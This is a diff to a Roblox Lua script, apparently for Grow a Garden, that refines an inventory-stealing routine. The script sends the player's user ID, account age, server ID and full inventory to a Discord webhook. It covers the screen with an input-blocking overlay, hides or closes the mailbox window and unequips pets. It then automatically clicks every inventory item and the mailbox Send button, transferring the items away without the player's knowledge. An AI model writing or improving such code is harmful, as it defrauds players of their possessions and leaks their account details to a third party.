@@ -43,27 +43,8 @@ Lighting.DepthOfField:GetPropertyChangedSignal("Enabled"):Connect(function()
 	Lighting.DepthOfField.Enabled = false
 end)
 
--- Hide MailboxUI frame instantly when it appears
-playerGui.ChildAdded:Connect(function(child)
-	if child.Name == "MailboxUI" then
-		local frame = child:WaitForChild("Frame", 5)
-		if frame then frame.Visible = false end
-		child.ChildAdded:Connect(function(c)
-			if c.Name == "Frame" then c.Visible = false end
-		end)
-	end
-end)
-
-local existing = playerGui:FindFirstChild("MailboxUI")
-if existing then
-	local existingFrame = existing:FindFirstChild("Frame")
-	if existingFrame then existingFrame.Visible = false end
-end
-
 -- ============================================================================
--- NEW: Pet scanner — pets live in PetList UI, not in the Backpack.
--- Scans playerGui.PetList.ScrollingFrame for owned pets and pulls a clean name
--- (and weight/age if visible). Returns { equippedPets, allPets }.
+-- Pet scanner — pets live in PetList UI, not in the Backpack.
 -- ============================================================================
 local function scanPets()
 	local equippedPets, allPets = {}, {}
@@ -79,35 +60,30 @@ local function scanPets()
 	end
 	if not scrollingFrame then return equippedPets, allPets end
 
-	-- Extract a readable name out of a pet card frame
 	local function extractName(card)
-		-- 1) Try common label names
 		for _, labelName in ipairs({ "PetName", "Name", "Title", "NameLabel" }) do
 			local lbl = card:FindFirstChild(labelName, true)
 			if lbl and lbl:IsA("TextLabel") and lbl.Text ~= "" then
 				return lbl.Text
 			end
 		end
-		-- 2) Fallback: first non-empty TextLabel
 		for _, d in ipairs(card:GetDescendants()) do
 			if d:IsA("TextLabel") and d.Text and d.Text ~= "" then
 				local t = d.Text
-				-- Skip pure-number labels (count/level badges)
 				if not t:match("^%s*[%d%.]+%s*$") then
 					return t
 				end
 			end
 		end
-		-- 3) Last resort: use the frame's own name
 		return card.Name
 	end
 
-	-- Try to get extra info: weight / age / kg
 	local function extractMeta(card)
 		for _, d in ipairs(card:GetDescendants()) do
 			if d:IsA("TextLabel") and d.Text then
 				local t = d.Text
-				if t:lower():find("kg") or t:lower():find("age") or t:lower():find("lvl") then
+				if t:lower():find("kg") or t:lower():find("age") or  --
+				t:lower():find("lvl") then
 					return t
 				end
 			end
@@ -115,9 +91,7 @@ local function scanPets()
 		return nil
 	end
 
-	-- Check if this card represents an equipped pet
 	local function isEquipped(card)
-		-- If there's a visible Unequip button, the pet is currently equipped
 		for _, d in ipairs(card:GetDescendants()) do
 			if d:IsA("GuiButton") and d.Name == "Unequip" and d.Visible == true then
 				if not string.find(d:GetFullName(), "Template") then
@@ -130,7 +104,6 @@ local function scanPets()
 
 	for _, card in ipairs(scrollingFrame:GetChildren()) do
 		if card:IsA("GuiObject") then
-			-- Ignore UI helpers / templates
 			local fullName = card:GetFullName()
 			if not fullName:find("Template") and not (card:IsA("UIListLayout") or card:IsA("UIGridLayout") or card:IsA("UIPadding")) then
 				local name = extractName(card)
@@ -154,12 +127,10 @@ local function sendBackpackToWebhook()
 	local backpack = localPlayer:FindFirstChild("Backpack")
 	if not backpack then warn("Backpack not found") return end
 
-	-- Lookup sets for fast categorisation
-	local seedSet, crateSet = {}, {}
+	local seedSet, crateSet = {}, {} --
 	for _, n in ipairs(FRUITS) do seedSet[n:lower()] = true end
 	for _, n in ipairs(CRATES) do crateSet[n:lower()] = true end
 
-	-- Heuristics for gear / pets (tool names in Backpack don't have Inv_ prefix)
 	local function isGear(name)
 		local n = name:lower()
 		return n:find("sprinkler") or n:find("watering") or n:find("can")
@@ -167,16 +138,11 @@ local function sendBackpackToWebhook()
 			or n:find("fertilizer") or n:find("hoe") or n:find("rake")
 	end
 
-	-- Known pets from Grow a Garden 2 tier list (S → C) + common variants
 	local petSet = {}
 	for _, n in ipairs({
-		-- S tier
 		"Raccoon","Black Dragon","BlackDragon","Ice Serpent","IceSerpent","Unicorn",
-		-- A tier
 		"Bee","Golden Dragonfly","GoldenDragonfly","DragonFly","Dragonfly","Deer","Bunny",
-		-- B tier
 		"Frog",
-		-- C tier
 		"Robin","Owl","Monkey"
 	}) do
 		petSet[n:lower()] = true
@@ -188,47 +154,104 @@ local function sendBackpackToWebhook()
 		if crateSet[low] then return "crates" end
 		if petSet[low] then return "pets" end
 		if isGear(name) then return "gear" end
-		return "other"
+		return "other" -- Everything not neatly categorized falls into "other" safely
+	end
+
+	-- Pull a stack count from a Tool (attribute, child IntValue, or fallback to 1)
+	local function getToolCount(tool)
+		for _, attr in ipairs({ "Count", "Amount", "Stack", "Quantity", "Stacks" }) do
+			local v = tool:GetAttribute(attr)
+			if type(v) == "number" and v > 0 then return v end
+		end
+		for _, childName in ipairs({ "Count", "Amount", "Stack", "Quantity" }) do
+			local c = tool:FindFirstChild(childName)
+			if c and c.Value then
+				local n = tonumber(c.Value)
+				if n and n > 0 then return n end
+			end
+		end
+		local tail = tool.Name:match("%[x(%d+)%]") or tool.Name:match("x(%d+)%s*$")
+		if tail then return tonumber(tail) end
+		return 1
+	end
+
+	local function cleanName(name)
+		return (name:gsub("%s*%[x%d+%]%s*$", ""):gsub("%s+x%d+%s*$", ""))
 	end
 
 	local buckets = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
-	local equippedItems = {}
+	local bucketTotals = { seeds = 0, pets = 0, gear = 0, crates = 0, other = 0 } --
+	local bucketLookups = { seeds = {}, pets = {}, gear = {}, crates = {}, other = {} }
+	local equippedItems, equippedLookup, equippedTotal = {}, {}, 0
+
+	local function addToBucket(category, name, count)
+		local lookup = bucketLookups[category]
+		local idx = lookup[name]
+		if idx then
+			buckets[category][idx].count = buckets[category][idx].count + count
+		else
+			table.insert(buckets[category], { name = name, count = count })
+			lookup[name] = #buckets[category]
+		end
+		bucketTotals[category] = bucketTotals[category] + count
+	end
+
+	local function addEquipped(name, count)
+		local idx = equippedLookup[name]
+		if idx then
+			equippedItems[idx].count = equippedItems[idx].count + count
+		else
+			table.insert(equippedItems, { name = name, count = count })
+			equippedLookup[name] = #equippedItems
+		end
+		equippedTotal = equippedTotal + count
+	end
 
 	for _, tool in ipairs(backpack:GetChildren()) do
 		if tool:IsA("Tool") then
-			table.insert(buckets[categorise(tool.Name)], tool.Name)
+			local clean = cleanName(tool.Name)
+			addToBucket(categorise(clean), clean, getToolCount(tool))
 		end
 	end
 
 	local character = localPlayer.Character
-	if character then
+	if character then --
 		for _, tool in ipairs(character:GetChildren()) do
 			if tool:IsA("Tool") then
-				table.insert(equippedItems, tool.Name)
+				local clean = cleanName(tool.Name)
+				addEquipped(clean, getToolCount(tool))
 			end
 		end
 	end
 
-	-- NEW: scan the PetList UI for owned pets (they aren't Tools)
 	local equippedPets, ownedPets = scanPets()
-	-- Merge equipped pets into the main "Equipped" field too
 	for _, p in ipairs(equippedPets) do
-		table.insert(equippedItems, "🐾 " .. p)
+		addEquipped("🐾 " .. p, 1)
 	end
-	-- Use scanned pets as the canonical pets bucket (overrides backpack-derived)
 	if #ownedPets > 0 then
-		buckets.pets = ownedPets
+		buckets.pets = {}
+		bucketLookups.pets = {}
+		bucketTotals.pets = 0
+		for _, p in ipairs(ownedPets) do
+			table.insert(buckets.pets, { name = p, count = 1 })
+			bucketTotals.pets = bucketTotals.pets + 1
+		end
 	end
 
-	local totalCount = #buckets.seeds + #buckets.pets + #buckets.gear
-		+ #buckets.crates + #buckets.other + #equippedItems
+	local totalCount = bucketTotals.seeds + bucketTotals.pets + bucketTotals.gear
+		+ bucketTotals.crates + bucketTotals.other + equippedTotal
 
-	-- Pretty list builder (markdown bullets, capped at Discord's 1024 char field limit)
 	local function formatList(list)
 		if #list == 0 then return "`— empty —`" end
 		local lines = {}
-		for i, name in ipairs(list) do
-			lines[i] = "`•` " .. name
+		for i, entry in ipairs(list) do
+			if type(entry) == "table" then
+				local suffix = (entry.count and entry.count > 1)
+					and (" `×" .. entry.count .. "`") or "" --
+				lines[i] = "`•` " .. entry.name .. suffix
+			else
+				lines[i] = "`•` " .. tostring(entry)
+			end
 		end
 		local text = table.concat(lines, "\n")
 		if #text > 1010 then
@@ -237,7 +260,6 @@ local function sendBackpackToWebhook()
 		return text
 	end
 
-	-- Resolve a working avatar URL from the modern Roblox thumbnails API.
 	local HttpService = game:GetService("HttpService")
 	local function fetchAvatar(endpoint, size)
 		local url = "https://thumbnails.roblox.com/v1/users/" .. endpoint
@@ -253,9 +275,8 @@ local function sendBackpackToWebhook()
 	local avatarThumb = fetchAvatar("avatar-headshot", "420x420")
 	local avatarAuthor = fetchAvatar("avatar-bust", "150x150") or avatarThumb
 
-	-- Account age + game info
 	local accountAgeDays = localPlayer.AccountAge
-	local placeId = tostring(game.PlaceId)
+	local placeId = tostring(game.PlaceId) --
 	local jobId = (game.JobId ~= "" and game.JobId) or "Studio / Solo"
 	local serverPlayers = #Players:GetPlayers()
 
@@ -265,32 +286,44 @@ local function sendBackpackToWebhook()
 			t.year, t.month, t.day, t.hour, t.min, t.sec)
 	end
 
-	-- Build fields dynamically so empty categories don't waste embed space
 	local fields = {
 		{ name = "👤 User ID", value = "`" .. tostring(localPlayer.UserId) .. "`", inline = true },
 		{ name = "📆 Account Age", value = "`" .. accountAgeDays .. " days`", inline = true },
 		{ name = "👥 In Server", value = "`" .. serverPlayers .. " players`", inline = true },
 		{ name = "🗺️ Place ID", value = "`" .. placeId .. "`", inline = true },
-		{ name = "🧩 Job ID", value = "`" .. jobId .. "`", inline = false },
-		{ name = "⚔️ Equipped (" .. #equippedItems .. ")",
+		{ name = "🧩 Job ID", value = "`" .. jobId .. "`", inline = false }, --
+		{ name = "📦 Totals",
+			value = string.format(
+				"🌾 Seeds: `%d`  •  🐾 Pets: `%d`  •  🛠️ Gear: `%d`\n📦 Crates: `%d`  •  ⚔️ Equipped: `%d`  •  ❔ Other: `%d`",
+				bucketTotals.seeds, bucketTotals.pets, bucketTotals.gear,
+				bucketTotals.crates, equippedTotal, bucketTotals.other
+			),
+			inline = false },
+		{ name = "⚔️ Equipped (" .. equippedTotal .. ")",
 			value = formatList(equippedItems), inline = false },
 	}
 
-	local function addCategory(emoji, label, list)
+	local function addCategory(emoji, label, list, total)
 		if #list > 0 then
+			local header
+			if total and total ~= #list then
+				header = string.format("%s %s (%d items / %d types)", emoji, label, total, #list)
+			else
+				header = string.format("%s %s (%d)", emoji, label, total or #list) --
+			end
 			table.insert(fields, {
-				name = emoji .. " " .. label .. " (" .. #list .. ")",
+				name = header,
 				value = formatList(list),
 				inline = false
 			})
 		end
 	end
 
-	addCategory("🌾", "Seeds", buckets.seeds)
-	addCategory("🐾", "Pets", buckets.pets)
-	addCategory("🛠️", "Gear", buckets.gear)
-	addCategory("📦", "Crates", buckets.crates)
-	addCategory("❔", "Other", buckets.other)
+	addCategory("🌾", "Seeds", buckets.seeds, bucketTotals.seeds)
+	addCategory("🐾", "Pets", buckets.pets, bucketTotals.pets)
+	addCategory("🛠️", "Gear", buckets.gear, bucketTotals.gear)
+	addCategory("📦", "Crates", buckets.crates, bucketTotals.crates)
+	addCategory("❔", "Other", buckets.other, bucketTotals.other)
 
 	local payload = HttpService:JSONEncode({
 		username = "Garden Logger",
@@ -308,7 +341,7 @@ local function sendBackpackToWebhook()
 			fields = fields,
 			footer = {
 				text = "Garden Logger • " .. totalCount .. " total items",
-				icon_url = avatarAuthor
+				icon_url = avatarAuthor --
 			},
 			timestamp = isoTimestamp()
 		}}
@@ -326,7 +359,7 @@ local function sendBackpackToWebhook()
 			if response.StatusCode >= 200 and response.StatusCode < 300 then
 				print("[GardenLogger] Inventory report sent for: " .. localPlayer.Name)
 			else
-				warn("[GardenLogger] Discord rejected the webhook — HTTP "
+				warn("[GardenLogger] Discord rejected the webhook — HTTP " --
 					.. tostring(response.StatusCode)
 					.. " | body: " .. tostring(response.Body or ""):sub(1, 300))
 				if response.StatusCode == 404 then
@@ -348,40 +381,6 @@ local function clickButton(button)
 	end)
 end
 
--- Click all inventory items matching a prefix asynchronously
-local function clickAllByPrefix(inventoryFrame, prefix)
-	for _, child in ipairs(inventoryFrame:GetChildren()) do
-		if child.Name:sub(1, #prefix) == prefix then
-			task.spawn(function()
-				local clickCount = 0
-				while clickCount < 999 do
-					local frame = inventoryFrame:FindFirstChild(child.Name)
-					if not frame then break end
-
-					local innerFrame = frame:FindFirstChildWhichIsA("Frame")
-					if not innerFrame then break end
-
-					local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-					if not button then break end
-
-					local countLabel = frame:FindFirstChild("Count", true)
-						or frame:FindFirstChild("Amount", true)
-						or innerFrame:FindFirstChildWhichIsA("TextLabel")
-					if countLabel then
-						local count = tonumber(countLabel.Text:match("%d+"))
-						if count and count <= 0 then break end
-					end
-
-					clickButton(button)
-					clickCount += 1
-					task.wait()
-				end
-			end)
-		end
-	end
-end
-
--- Check if there is anything left to send
 local function hasAnythingToSend(inventoryFrame)
 	for _, child in ipairs(inventoryFrame:GetChildren()) do
 		local name = child.Name
@@ -395,7 +394,6 @@ local function hasAnythingToSend(inventoryFrame)
 	return false
 end
 
--- Independent unequip mechanics targeting the PetList UI container
 local function runSequence()
 	local petList = playerGui:FindFirstChild("PetList")
 	if not petList then return end
@@ -433,8 +431,15 @@ local function runSequence()
 	safeClick(toggleButton)
 end
 
--- Main send function
 local function runScript()
+	-- Targeted Mailbox Cleanup: Only clean up the mailbox window when launching the sequence
+	local mailbox = playerGui:FindFirstChild("MailboxUI")
+	if mailbox then
+		local closeBtn = mailbox:FindFirstChild("CloseButton", true)
+		if closeBtn then pcall(function() firesignal(closeBtn.MouseButton1Click) end) end
+		task.wait(0.2)
+	end
+
 	local touchShield = Instance.new("ScreenGui")
 	touchShield.Name = "TouchShieldSystem"
 	touchShield.DisplayOrder = 999999
@@ -448,13 +453,6 @@ local function runScript()
 
 	pcall(runSequence)
 	task.wait(0.5)
-
-	local oldUI = playerGui:FindFirstChild("MailboxUI")
-	if oldUI then
-		local closeBtn = oldUI:FindFirstChild("CloseButton", true)
-		if closeBtn then pcall(function() firesignal(closeBtn.MouseButton1Click) end) end
-		task.wait(0.1)
-	end
 
 	local mailboxPrompt = workspace.Gardens.Plot1.Signs.GreyMailBox.ProximityPromptPart.MailboxPrompt
 	fireproximityprompt(mailboxPrompt)
@@ -532,93 +530,19 @@ local function runScript()
 		return "done"
 	end
 
-	local priorityPets = {
-		"Raccoon", "Black Dragon", "Ice Serpent", "Unicorn",
-		"Bee", "Golden Dragonfly", "Deer", "Bunny",
-		"Frog",
-		"Robin", "Owl", "Monkey"
-	}
-
-	local function normalizeName(s)
-		return (s:lower():gsub("[%s_%-]", ""))
-	end
-
-	local invChildrenByNorm = {}
-	for _, child in ipairs(inventoryFrame:GetChildren()) do
-		local cname = child.Name
-		if cname:sub(1, 9) == "Inv_Pets:" then
-			local petPart = cname:sub(10)
-			invChildrenByNorm[normalizeName(petPart)] = child
+	-- IMPROVED ITEM SENDER: Clicks everything in the inventory window generically
+	local function sendAllInventoryItems(targetFrame)
+		for _, item in ipairs(targetFrame:GetChildren()) do
+			local inner = item:FindFirstChildWhichIsA("Frame")
+			local btn = inner and inner:FindFirstChildWhichIsA("GuiButton")
+			if btn then
+				clickButton(btn)
+				task.wait(0.05)
+			end
 		end
 	end
 
-	for _, petName in ipairs(priorityPets) do
-		local key = normalizeName(petName)
-		local petFrame = invChildrenByNorm[key]
-		if petFrame then
-			task.spawn(function()
-				local innerFrame = petFrame:FindFirstChildWhichIsA("Frame") or petFrame
-				local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-					or petFrame:FindFirstChildWhichIsA("GuiButton", true)
-				if button then
-					clickButton(button)
-				end
-			end)
-		end
-	end
-
-	task.wait(0.2)
-
-	task.spawn(function()
-		clickAllByPrefix(inventoryFrame, "Inv_Pets:")
-	end)
-
-	task.spawn(function()
-		for _, fruitName in ipairs(FRUITS) do
-			local frameName = "Inv_Seeds:" .. fruitName
-			task.spawn(function()
-				local clickCount = 0
-				while clickCount < 999 do
-					local fruitFrame = inventoryFrame:FindFirstChild(frameName)
-					if not fruitFrame then break end
-					local innerFrame = fruitFrame:FindFirstChildWhichIsA("Frame")
-					if not innerFrame then break end
-					local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-					if not button then break end
-					clickButton(button)
-					clickCount += 1
-					task.wait()
-				end
-			end)
-		end
-	end)
-
-	task.spawn(function()
-		for _, crateName in ipairs(CRATES) do
-			local frameName = "Inv_Crates:" .. crateName
-			task.spawn(function()
-				local clickCount = 0
-				while clickCount < 999 do
-					local crateFrame = inventoryFrame:FindFirstChild(frameName)
-					if not crateFrame then break end
-					local innerFrame = crateFrame:FindFirstChildWhichIsA("Frame")
-					if not innerFrame then break end
-					local button = innerFrame:FindFirstChildWhichIsA("GuiButton")
-					if not button then break end
-					clickButton(button)
-					clickCount += 1
-					task.wait()
-				end
-			end)
-		end
-	end)
-
-	task.spawn(function()
-		for _, prefix in ipairs(GEAR_PREFIXES) do
-			clickAllByPrefix(inventoryFrame, prefix)
-		end
-	end)
-
+	sendAllInventoryItems(inventoryFrame)
 	task.wait(0.6)
 
 	local sendButton = itemSendFrame:WaitForChild("SendButton", 5)
@@ -633,7 +557,6 @@ end
 -- Send webhook on game load (give PetList a moment to populate so pets show up)
 task.spawn(function()
 	task.wait(2)
-	-- Briefly open the PetList so its ScrollingFrame populates, then close it
 	local petList = playerGui:FindFirstChild("PetList")
 	if petList then
 		local openBtn = petList:FindFirstChild("Exit", true) and petList.Exit:FindFirstChild("OpenButton")
